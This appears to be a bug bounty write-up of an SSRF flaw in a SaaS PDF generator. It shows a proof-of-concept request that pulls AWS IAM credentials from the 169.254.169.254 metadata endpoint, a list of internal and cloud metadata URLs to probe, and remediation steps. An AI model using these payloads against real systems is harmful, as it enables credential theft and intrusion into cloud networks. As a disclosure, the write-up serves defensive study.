# Title: Server-Side Request Forgery in Dynamic PDF Generator

- **Platform**: Cobalt
- **Program**: Document Management SaaS
- **Severity**: High
- **Date**: November 2024
- **Researcher**: Cobalt Core Pentester (anonymous)
- **Bounty**: $2,000

## Summary

A Server-Side Request Forgery (SSRF) vulnerability was discovered in a document management platform's PDF generation feature during a Cobalt penetration test. The application accepted a user-supplied URL to fetch content for inclusion in dynamically generated PDF documents. The server-side HTTP client did not validate or restrict the target URLs, allowing an attacker to make requests to internal network resources and cloud metadata endpoints.

## Technical Details

The application offered a "Generate Report" feature that allowed users to create PDF documents by providing a URL. The server would fetch the content at the provided URL, convert it to PDF, and serve the resulting document. This functionality was intended to allow users to include web pages in their reports.

The vulnerable endpoint accepted a `url` parameter:

```http
POST /api/v1/generate-pdf
Content-Type: application/json

{
  "url": "https://example.com/report-content",
  "format": "A4",
  "margin": "10mm"
}
```

The server used a headless browser (Puppeteer/Chromium) to render the URL and generate the PDF. The URL was provided directly to the browser without validation, enabling SSRF to internal services.

## Steps to Reproduce

1. Create an account and obtain a valid API token
2. Identify the PDF generation endpoint
3. Attempt to fetch common internal metadata endpoints
4. Observe that the generated PDF contains the contents of internal resources

## Proof of Concept

Request to the PDF generation endpoint with an internal URL:

```http
POST /api/v1/generate-pdf HTTP/1.1
Host: app.documents.target.com
Authorization: Bearer [token]
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role",
  "format": "A4"
}
```

The generated PDF contained:

```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjEH0...",
  "Expiration": "2024-11-15T00:00:00Z"
}
```

Additional internal resources probed:

```http
http://127.0.0.1:9200/                    # Elasticsearch
http://127.0.0.1:6379/                    # Redis
http://10.0.0.1:8080/                     # Internal admin panel
http://metadata.google.internal/          # GCP metadata
http://100.100.100.200/latest/meta-data/  # Alibaba Cloud metadata
```

## Impact

- Full compromise of AWS IAM credentials for the EC2 instance role
- Access to internal services (databases, caching layers, internal APIs)
- Lateral movement opportunities within the cloud infrastructure
- Potential for Remote Code Execution via internal service exploitation
- Data exfiltration of internal application data

The SSRF in this case was particularly critical because the application ran on AWS EC2 with an IAM role that had broad permissions, including S3 bucket access and DynamoDB read/write capabilities.

## Remediation

- Implement a strict allowlist of permitted URLs/domains for the PDF generator
- Block access to private IP ranges (RFC 1918, RFC 6598) and link-local addresses (169.254.0.0/16)
- Use a dedicated, isolated network environment for the PDF generation service
- Disable the PDF generation feature if not critical, or replace with local content rendering
- Apply network-level controls (security groups, NACLs) to prevent outbound traffic to metadata endpoints
- Upgrade to a serverless architecture that does not have IAM credentials injected into the instance

## References
- https://www.cobalt.io/vulnerability-wiki/
- https://www.cobalt.io/blog/how-to-write-a-great-vulnerability-report
